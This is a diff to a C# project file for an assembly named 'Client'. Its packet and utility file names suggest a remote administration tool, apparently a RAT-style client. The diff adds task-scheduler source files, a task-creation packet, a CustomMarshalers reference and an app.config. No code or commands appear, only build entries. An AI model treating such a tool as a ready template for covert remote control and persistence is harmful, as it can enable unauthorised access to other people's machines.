@@ -12,7 +12,8 @@
     <AssemblyName>Client</AssemblyName>
     <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
-    <TargetFrameworkProfile>Client</TargetFrameworkProfile>
+    <TargetFrameworkProfile>
+    </TargetFrameworkProfile>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
     <PlatformTarget>x86</PlatformTarget>
@@ -43,6 +44,7 @@
     <ApplicationManifest>app.manifest</ApplicationManifest>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="CustomMarshalers" />
     <Reference Include="Microsoft.VisualBasic" />
     <Reference Include="System" />
     <Reference Include="System.Drawing" />
@@ -192,6 +194,7 @@
     <Compile Include="Core\Packets\ClientPackets\SetStatusFileManager.cs" />
     <Compile Include="Core\Packets\PacketRegistery.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoCreateDirectory.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoCreateTask.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoDownloadDirectory.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoDownloadFilePause.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoUploadDirectory.cs" />
@@ -226,6 +229,8 @@
     <Compile Include="Core\Data\Host.cs" />
     <Compile Include="Core\Utilities\HostsManager.cs" />
     <Compile Include="Core\Utilities\NativeMethods.cs" />
+    <Compile Include="Core\Utilities\TaskScheduler\Legacy\TaskSchedulerLegacy.cs" />
+    <Compile Include="Core\Utilities\TaskScheduler\TaskScheduler.cs" />
     <Compile Include="Core\Utilities\UnsafeStreamCodec.cs" />
     <Compile Include="Core\Compression\JpgCompression.cs" />
     <Compile Include="Core\Extensions\SocketExtensions.cs" />
@@ -350,6 +355,7 @@
       <DependentUpon>Resources.resx</DependentUpon>
       <DesignTime>True</DesignTime>
     </Compile>
+    <None Include="app.config" />
     <None Include="app.manifest" />
     <None Include="Properties\Settings.settings">
       <Generator>SettingsSingleFileGenerator</Generator>
